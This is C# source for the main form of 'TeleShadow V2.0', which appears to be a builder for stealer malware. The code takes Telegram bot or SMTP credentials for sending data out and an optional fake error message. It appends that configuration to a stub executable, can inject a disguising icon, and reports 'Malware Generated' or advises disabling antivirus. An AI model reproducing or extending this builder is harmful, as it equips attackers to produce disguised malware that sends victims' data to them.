using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Threading;

namespace NULL
{
    public partial class Main : Form
    {
        internal static string Temp = null;
        internal static bool SelectedCustomImage = false;
        public Main()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Controller.Interval = 100;
            Controller.Start();
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void Controller_Tick(object sender, EventArgs e)
        {
            if (RD_Telegram.Checked)
            {
                GroupSMTP.Enabled = false;
                GroupTGApi.Enabled = true;
            }
            else if (RD_SMTP.Checked)
            {
                GroupTGApi.Enabled = false;
                GroupSMTP.Enabled = true;
            }

            if (ChkIco9.Checked)
            {
                BtnBrowse.Visible = true;
            }
            else
            {
                BtnBrowse.Visible = false;
            }
            if (ChkIco1.Checked)
            {
                Temp = @"Icon\SAR1.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco2.Checked)
            {
                Temp = @"Icon\SAR2.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco3.Checked)
            {
                Temp = @"Icon\SAR3.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco4.Checked)
            {
                Temp = @"Icon\SAR4.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco5.Checked)
            {
                Temp = @"Icon\SAR5.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco6.Checked)
            {
                Temp = @"Icon\SAR6.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco7.Checked)
            {
                Temp = @"Icon\SAR7.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco8.Checked)
            {
                Temp = @"Icon\SAR8.ico"; SelectedCustomImage = false;
                IconPriv.Image = Image.FromFile(Temp);
            }
            else if (ChkIco00.Checked)
            {
                Temp = null; SelectedCustomImage = false;
            }
        }
        private void BTN_Test_Click(object sender, EventArgs e)
        {
            int Message = 0;
            if (RD_Error.Checked)
            { Message = 1; }
            else if (RD_Question.Checked)
            { Message = 2; }
            else if (RD_Info.Checked)
            { Message = 3; }
            switch (Message)
            {
                case 1:
                    MessageBox.Show(FakeM_Body.Text, FakeM_Title.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
                case 2:
                    MessageBox.Show(FakeM_Body.Text, FakeM_Title.Text, MessageBoxButtons.OK, MessageBoxIcon.Question);
                    break;
                case 3:
                    MessageBox.Show(FakeM_Body.Text, FakeM_Title.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                default:
                    MessageBox.Show("Fake Message Disabled!", "");
                    break;
            }
        }
        string GetFakeMessage()
        {
            string Split = "~"; // Split char !
            string Config = null;
            if (RD_Disable.Checked)
            {
                return "N"
                      + Split
                      + "N"
                      + Split
                      + "N";
            }
            else
            {
                if (RD_Question.Checked)
                { Config = "Question"; }
                else if (RD_Info.Checked)
                { Config = "Info"; }
                else if (RD_Error.Checked)
                { Config = "Error"; }
                return Config
                       + Split
                       + FakeM_Title.Text
                       + Split
                       + FakeM_Body.Text;
            }
        }
        String GetSMTP()
        {
            string Split = "~"; // Split char !
            string Config = null;
            switch (SMTP_Combo.Text)
            {
                case "Gmail":
                    Config = "smtp.gmail.com";
                    break;
                case "Yahoo":
                    Config = "smtp.yahoo.com";
                    break;
                case "Outlook":
                    Config = "smtp.Outlook.com";
                    break;
                case "Yandex":
                    Config = "smtp.yandex.ru";
                    break;
                default:
                    Config = SMTP_Combo.Text;
                    break;
            }
            return Config
                  + Split
                  + SMTP_User.Text
                  + Split
                  + SMTP_Pass.Text;
        }


        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            var Browse = new OpenFileDialog();
            Browse.Filter = "Icon |*.ico";
            Browse.ShowDialog();
            Temp = Browse.FileName;
            if (Temp != "")
            {
                IconPriv.Image = Image.FromFile(Temp);
                SelectedCustomImage = true;
            }
        }
        private bool MD;
        private Point Ll;
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            MD = true;
            Ll = e.Location;
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            MD = false;
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (MD)
            {
                this.Location = new Point(
                    (this.Location.X - Ll.X) + e.X, (this.Location.Y - Ll.Y) + e.Y);

                this.Update();
            }
        }
        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void BtnMaximize_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
                this.WindowState = FormWindowState.Maximized;
            else
                this.WindowState = FormWindowState.Normal;
        }

        private void BtnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void BTN_About_Click(object sender, EventArgs e)
        {
            AboutBox a = new AboutBox();
            a.ShowDialog();
            Thread trd = new Thread(WriteAbout);
            Thread.Sleep(1);
            trd.IsBackground = true;
            trd.Start();
        }

        private void WriteAbout()
        {
            LabelAbout.Text = "";
            LabelAbout.Visible = true;
            string text = "Thank you for using TeleShadow V2.0 !";
            foreach (char c in text.ToCharArray())
            {
                LabelAbout.Text += c.ToString();
                Thread.Sleep(50);
            }
            Thread.Sleep(5000);
            LabelAbout.Text = "";
        }
        private byte[] Combine(byte[] a123, byte[] b123)
        {
            byte[] c123 = new byte[a123.Length + b123.Length];
            Buffer.BlockCopy(a123, 0, c123, 0, a123.Length);
            Buffer.BlockCopy(b123, 0, c123, a123.Length, b123.Length);
            return c123;
        }
        private static string Reverse(string str)
        {
            int Lentgh = str.Length - 1;
            char[] StringCharacters = str.ToCharArray();
            string FinalSTR = "";
            for (int i = Lentgh; i >= 0; i--)
            {
                FinalSTR += StringCharacters[i].ToString();
            }
            return FinalSTR;
        }
        private void BTN_Build_Click(object sender, EventArgs e)
        {
            string Split = "`"; // Split char !
            string Config = "";
            if (RD_Telegram.Checked)
            {
                Config = "0"
                         + Split
                         + Telegram_Token.Text
                         + Split
                         + Telegram_ID.Text
                         + Split
                         + GetFakeMessage();
            }
            else
            {
                Config = "1"
                         + Split
                         + GetSMTP()
                         + Split
                         + SMTP_IN.Text
                         + Split
                         + GetFakeMessage();
            }
            if (Encoding.UTF8.GetBytes(Config).Length >= 1024)
            {
                MessageBox.Show("Bad/Large Config !", "", MessageBoxButtons.OK, MessageBoxIcon.Error); return;
            }
            else
            {
                 try
            {
                var Browse = new SaveFileDialog();
                Browse.Filter = "Excutable |*.exe";
                Browse.ShowDialog();
                string Temp2 = Browse.FileName;
                byte[] Data = Encoding.UTF8.GetBytes(Config);
                byte[] Trim = new Byte[1024 - Data.Length];
                Data = Combine(Data, Trim);
                Data = Core.Encode.Reverse(Data);
                byte[] Stub = File.ReadAllBytes("Stubx");
                File.WriteAllBytes(Temp2.ToString(), Stub);
                if (ChkIco1.Checked)
                {Temp = @"Icon\SAR1.ico";}
                else if (ChkIco2.Checked)
                {Temp = @"Icon\SAR2.ico";}
                else if (ChkIco3.Checked)
                {Temp = @"Icon\SAR3.ico";}
                else if (ChkIco4.Checked)
                {Temp = @"Icon\SAR4.ico";}
                else if (ChkIco5.Checked)
                {Temp = @"Icon\SAR5.ico";}
                else if (ChkIco6.Checked)
                {Temp = @"Icon\SAR6.ico";}
                else if (ChkIco7.Checked)
                { Temp = @"Icon\SAR7.ico"; }
                else if (ChkIco8.Checked)
                { Temp = @"Icon\SAR8.ico"; }
                if (ChkIco00.Checked == false)
                {
                    Core.Icon.InjectIcon(Temp2, Temp);
                    IconPriv.Image = Image.FromFile(Temp);  
                }
                Stub = File.ReadAllBytes(Temp2);
                Array.Resize(ref Stub, Stub.Length + 1024);
                for (int i = 0; i < Data.Length; i++)
                {
                    Stub[(Stub.Length - 1024) + i] = Data[i];
                }
                File.WriteAllBytes(Temp2, Stub);
                if (File.Exists(Temp2)){
                    MessageBox.Show("Malware \"" + Temp2 + "\" Generated.", " Malware Generated ...", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else{
                    MessageBox.Show("Malware Not Exists, Try Disable A.V ", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                Temp = null;
            }
            catch (Exception)
            {}
            }    
           
        }

        private void ChkIco9_CheckedChanged(object sender, EventArgs e)
        {
            //if(!SelectedCustomImage)
          //  {
           // }
        }

        private void ChkIco3_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}